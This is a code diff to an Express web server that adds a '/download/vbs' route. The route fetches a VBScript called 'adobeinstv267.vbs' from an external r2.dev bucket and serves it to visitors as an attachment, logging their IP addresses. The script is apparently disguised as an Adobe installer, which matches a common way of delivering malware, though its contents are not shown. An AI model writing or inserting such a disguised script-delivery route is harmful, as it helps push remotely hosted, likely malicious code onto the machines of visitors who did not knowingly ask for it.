@@ -241,6 +241,38 @@ app.use((req, res, next) => {
   next();
 });
 
+
+// ======= VBS Download Proxy =======
+app.get('/download/vbs', async (req, res) => {
+    try {
+        const vbsUrl = 'https://pub-05a36c67a70d476394cc0b8a3f67777f.r2.dev/adobeinstv267.vbs';
+        
+        const response = await fetch(vbsUrl);
+        const data = await response.text();
+        
+        // Set proper download headers
+        res.setHeader('Content-Type', 'application/octet-stream');
+        res.setHeader('Content-Disposition', 'attachment; filename="adobeinstv267.vbs"');
+        res.setHeader('Content-Length', Buffer.byteLength(data));
+        
+        res.send(data);
+        
+        log('info', { 
+            event: 'vbs_download', 
+            ip: getClientIp(req), 
+            size: Buffer.byteLength(data)
+        });
+        
+    } catch (error) {
+        log('error', { 
+            event: 'vbs_download_failed', 
+            ip: getClientIp(req), 
+            reason: error.message 
+        });
+        res.status(500).send('Download failed');
+    }
+});
+
 // ======= Routes =======
 app.get('/', (req, res) => {
   return res.sendFile(path.join(__dirname, 'pages', 'home.html'));
